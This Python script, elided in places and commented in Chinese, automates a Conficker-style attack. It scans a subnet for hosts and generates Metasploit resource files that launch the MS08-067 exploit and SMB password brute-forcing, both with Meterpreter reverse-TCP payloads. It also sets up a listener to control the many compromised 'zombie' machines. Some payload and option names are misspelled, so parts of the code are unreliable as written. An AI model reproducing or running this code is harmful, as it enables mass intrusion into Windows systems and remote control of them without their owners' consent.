# -*- coding: utf-8 -*-
"""
Created on Wed Jul 17 10:48:05 2019
...
def findTgts(subNet):
    ...
    return tgtHosts
#新建一个监视器,命令与控制管道,方便之后交互动作
def setupHandler(configFile,lhost,lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set PYLOAD '+'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT '+str(lport)+'\n')
    configFile.write('set LHOST '+lhost +'\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePaylodHandler 1\n')
    
#指定使用ms8_067_netapi漏洞利用
def confickerExploit(configFile,tgtHost,lhost,lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST '+str(tgtHost) +'\n')
    configFile.write('set PYLOAD '+'windowss/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT '+str(lport)+'\n')
    configFile.write('set LHOST '+lhost+'\n')
    configFile.write('exploit -j -z\n')#-j 代表同一个job中,-z代表不与任务进行实时交互
    #因为该任务会有很多肉鸡,无法同时与所有肉鸡交互
...
def smbBrute(configFile,tgtHost,passwdFile,lhost,lport):
    ...
    for password in pF.readlines():
        ...
        configFile.write('set RHOST '+str(tgtHost)+'\n')
        configFile.write('set PAYLOAD '+'windows/metertpreter/reverse_tcp\n')
        configFile.write('set LPORT '+str(lport)+'\n')
        configFile.write('set LHOST '+lhost+'\n')
        configFile.write('exploit -j -z\n')
...
def main():
    ...
    parser.add_option('-F',dest='passwdFile',type='string',help='password for smb brute force attempt')
